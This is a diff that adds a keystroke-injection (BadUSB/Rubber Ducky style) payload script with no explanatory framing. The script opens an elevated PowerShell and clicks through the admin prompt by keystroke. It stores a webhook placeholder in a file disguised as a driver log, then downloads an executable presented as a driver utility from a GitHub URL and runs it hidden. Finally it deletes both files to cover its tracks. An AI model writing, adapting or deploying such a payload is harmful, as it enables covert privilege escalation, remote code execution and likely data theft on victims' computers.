@@ -1,0 +1,41 @@
+DELAY 100
+WINDOWS r
+DELAY 200
+STRING powershell
+DELAY 100
+ENTER
+DELAY 500
+STRING start-process Powershell -verb runas
+DELAY 200
+ENTER
+DELAY 500
+LEFTARROW
+DELAY 300
+ENTER
+DELAY 700
+STRING $webhook = "PUT WEBHOOK HERE"
+DELAY 50
+ENTER
+STRING New-Item "C:\Program Files (x86)\Temp\DriverUtilLog.txt" -ItemType File -Value $webhook
+DELAY 100
+ENTER
+DELAY 50
+STRING $url = 'https://github.com/PCMonster1/WindowsDriverImportant/raw/main/TempDriverUtil.exe'; $file = 'C:\Program Files (x86)\Temp\TempDriverUtil.exe'; Invoke-WebRequest -Uri $url -OutFile $file; Start-Process -FilePath $file -WindowStyle Hidden
+DELAY 100
+ENTER
+DELAY 9000
+STRING remove-item "C:\Program Files (x86)\Temp\DriverUtilLog.txt"
+DELAY 100
+ENTER
+DELAY 50
+STRING remove-item "C:\Program Files (x86)\Temp\TempDriverUtil.exe"
+DELAY 100
+ENTER
+DELAY 100
+STRING exit
+DELAY 50
+ENTER
+DELAY 100
+STRING exit
+DELAY 50
+ENTER
